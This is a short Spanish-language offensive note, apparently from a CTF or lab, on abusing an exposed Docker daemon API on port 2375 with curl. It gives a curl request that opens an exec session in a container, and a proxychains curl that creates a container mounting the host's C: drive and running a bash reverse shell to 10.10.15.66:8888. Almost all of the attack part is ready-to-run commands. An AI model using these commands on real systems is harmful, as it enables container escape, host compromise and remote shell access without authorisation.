
Docker en si es un daemon que expone localmente una API REST, con la cual el CLI o el Docker Desktop interactuan, que quiere decir esto? bueno, basicamente que podemos hacer cualquier cosa que hariamos con el CLI o desde Docker Desktop pero con curl haciendo peticiones web:

Aqui podemos encotnrar todas las formas de haber interactuado con esta misma API

https://docs.docker.com/reference/api/engine/version/v1.43/#tag/Image/operation/ImageTag



### Ejecutar Reverse Shell en determinado contenedor

Cuando creamos un contenedor podemos especificar un comando a ejecutar 

```python
curl -X POST -H "Content-Type: application/json" \  
http://192.168.65.7:2375/containers/<container_id>/exec \  
-d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/bash"],"DetachKeys":"ctrl-p,ctrl-q","Privileged":false,"Tty":true}'
```

# Dumpear HostSystem  en contenedor


```ruby
proxychains4 curl -X POST -H "Content-Type: application/json" http://192.168.65.7:2375/containers/create?name=docker -d '{"Image":"docker_setup-nginx-php:latest","Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.66/8888 0>&1"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}'
```

